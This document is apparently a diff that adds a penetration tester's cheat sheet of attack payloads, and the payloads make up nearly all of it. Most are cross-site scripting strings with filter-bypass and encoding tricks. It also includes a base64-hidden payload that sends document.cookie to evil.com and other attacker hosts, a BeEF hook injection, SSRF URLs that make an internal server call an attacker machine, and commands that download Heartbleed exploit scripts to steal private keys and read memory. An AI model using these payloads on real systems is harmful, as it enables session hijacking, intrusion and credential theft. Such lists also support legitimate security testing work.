@@ -1,0 +1,121 @@
+﻿'%uff1cscript%uff1ealert('XSS');%uff1c/script%uff1e'
+<img src=x onerror=alert('XSS')>.png
+"><img src=x onerror=alert('XSS')>.png
+"><svg onmouseover=alert(1)>.svg
+
+
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+   <script type="text/javascript">
+      alert('XSS!');
+   </script>
+</svg>
+
+
+<html>
+<head></head>
+<body>
+<something:script xmlns:something="http://www.w3.org/1999/xhtml">alert(1)</something:script>
+</body>
+</html>
+
+
+script-src self: <object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>
+
+\”}})})-confirm`1`//
+\”}})})-confirm`1`/*/
+\”}})})-confirm`1`;/*///
+ \”}})})-confirm`1`;{/*///
+ \”}})})-confirm`1`;({{/*///
+svg/onload
+'-alert(1)-'
+eval(atob('YWxlcnQoMSk='))
+<iMg SrC=x OnErRoR=alert(1)>
+<div onmouseover="alert('XSS');">
+</Textarea/</Noscript/</Pre/</Xmp><Svg /Onload=confirm(document.domain)>
+x@x.com<--`<img/src=` onerror=alert(1)> --!>
+""[(!1+"")[3]+(!0+"")[2]+(''+{})[2]][(''+{})[5]+(''+{})[1]+((""[(!1+"")[3]+(!0+"")[2]+(''+{})[2]])+"")[2]+(!1+'')[3]+(!0+'')[0]+(!0+'')[1]
+<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="imag
+
+polyglot
+
+oNcliCk=alert(1)%20)//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>%5Cx3csVg/<img/src/onerror=alert(2)>%5Cx3e
+
+
+
+Blacklist bypass:
+I came across a site recently that was blacklisting //, :, ", <, and >. This is what I did to get around that issue:
+
+btoa('document.location="http://evil.com:8090/r.php?c="+document.cookie')
+
+gives you this string:
+'ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9ldmlsLmNvbTo4MDkwL3IucGhwP2M9Iitkb2N1bWVudC5jb29raWU='
+
+Use this payload:
+
+eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9ldmlsLmNvbTo4MDkwL3IucGhwP2M9Iitkb2N1bWVudC5jb29raWU='))
+
+
+<svg onload=fetch("//attacker/r.php?="%2Bcookie)>
+
+
+
+
+
+
+
+
+
+
+DOM-based XSS Payloads:
+
+<target.com>/#<img/src/onerror=alert("XSS")>
+
+If jQuery is being used and you want to get a beef hook into place (be sure to modify the URL encoded string before using):
+
+<target.com>/#img/src/onerror=$("body").append(decodeURIComponent('%3c%73%63%72%69%70%74%20%73%72%63%3d%68%74%74%70%3a%2f%2f%3c%65%76%69%6c%20%69%70%3e%3a%33%30%30%30%2f%68%6f%6f%6b%2e%6a%73%3e%3c%2f%73%63%72%69%70%74%3e'))>
+
+Another one from a James Kettle bug bounty submission:
+#<img/src="1"/onerror=alert(1)>
+Another one from here:
+#><img src=x onerror=prompt(1);>
+
+SSRF
+
+
+http://internal-vulnerable-server/rce?cmd=wget%20attackers-machine:4000&
+http://internal-vulnerable-server/rce?cmd=wget%20attackers-machine:4000#
+
+
+
+
+
+
+Testing for heartbleed
+
+nmap -d --script ssl-heartbleed --script-args vulns.showall -sV -p <port> <target ip> --script-trace -oA heartbleed-%y%m%d
+
+Steal private key:
+
+wget https://gist.githubusercontent.com/eelsivart/10174134/raw/8aea10b2f0f6842ccff97ee921a836cf05cd7530/heartbleed.py
+echo "<target>:<port>" > targets.txt
+python heartbleed.py -f targets.txt -v -e
+
+Read through the memory:
+
+wget https://raw.githubusercontent.com/sensepost/heartbleed-poc/master/heartbleed-poc.py
+python heartbleed-poc.py <target> -p <target port> | less
+
+
+http://onmouseover=alert(1);
+"onmouseover"=alert(1)
+'+alert(1)+'
+"><h1>test</h1>
+
+
+
+'"><svg/onload=prompt(5);>{{7*7}}
+
+
+
+
